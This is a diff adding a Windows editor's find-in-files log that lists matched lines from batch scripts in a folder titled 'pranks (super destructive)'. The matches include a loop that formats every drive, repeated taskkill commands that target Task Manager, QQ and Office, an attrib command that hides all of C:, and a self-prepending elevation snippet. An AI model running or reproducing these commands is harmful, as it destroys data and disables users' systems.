@@ -1,0 +1,57 @@
+[2017/11/17 周五 18:42:45.29] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\恶搞.bat
+24:for %%a in (%a%) do format /q /y %%a:
+9:@del %systemroot%\testfile.tmp
+10:@if exist getadm.vbs del getadm.vbs
+
+[2017/11/17 周五 18:43:26.90] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\Bluescreen.bat
+
+[2017/11/17 周五 18:43:35.33] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\Breaknetwork.bat
+
+[2017/11/17 周五 18:43:41.36] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\Delete.bat
+
+[2017/11/17 周五 18:44:52.25] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\Killprocess.bat
+8:taskkill /f /im QQ.exe
+9:taskkill /f /im notepad.exe
+10:taskkill /f /im Taskmgr.exe
+11:taskkill /f /im MSACCESS.EXE
+12:taskkill /f /im EXCEL.EXE
+13:taskkill /f /im OUTLOOK.EXE
+14:taskkill /f /im POWERPNT.EXE
+15:taskkill /f /im WINWORD.EXE
+16:taskkill /f /im StormPlayer.exe
+17:taskkill /f /im QQ.exe
+18:taskkill /f /im QQ.exe
+19:taskkill /f /im QQ.exe
+20:taskkill /f /im QQ.exe
+21:taskkill /f /im QQ.exe
+22:taskkill /f /im QQ.exe
+23:taskkill /f /im QQ.exe
+24:taskkill /f /im QQ.exe
+
+[2017/11/17 周五 18:45:22.63] C:\Users\15158\Documents\BAT批处理\恶搞（超强破坏力）\Systemhalted.bat
+
+[2019/04/16 周二 14:43:15.01] C:\Users\wangd\OneDrive\文档\BAT批处理\获取最高权限.bat
+
+[2019/04/16 周二 14:43:46.95] C:\Users\wangd\OneDrive\文档\BAT批处理\获取最高权限.bat
+15:echo @del %%systemroot%%\testfile.tmp>>part1.txt
+16:echo @if exist getadm.vbs del getadm.vbs>>part1.txt
+22:del part1.txt
+23:del part2.txt
+20:copy %filename% part2.txt
+21:copy /b part1.txt + /b part2.txt /b %filename%
+
+[2019/04/16 周二 14:44:27.64] C:\Users\wangd\OneDrive\文档\BAT批处理\格式化.BAT
+14:format /q %disk%
+
+[2019/04/16 周二 14:44:44.91] C:\Users\wangd\OneDrive\文档\BAT批处理\恶搞（超强破坏力）\恶搞.bat
+24:for %%a in (%a%) do format /q /y %%a:
+9:@del %systemroot%\testfile.tmp
+10:@if exist getadm.vbs del getadm.vbs
+21:start delete.bat
+
+[2019/04/16 周二 14:45:14.45] C:\Users\wangd\OneDrive\文档\BAT批处理\Bitlocker\Bitlocker锁定所有加密驱动器.bat
+9:@del %systemroot%\testfile.tmp
+10:@if exist getadm.vbs del getadm.vbs
+
+[2020/06/16 周二 14:52:52.29] C:\Users\wangd\OneDrive\文档\BAT批处理\恶搞（超强破坏力）\delete.bat
+3:attrib +h +s c:\ /s
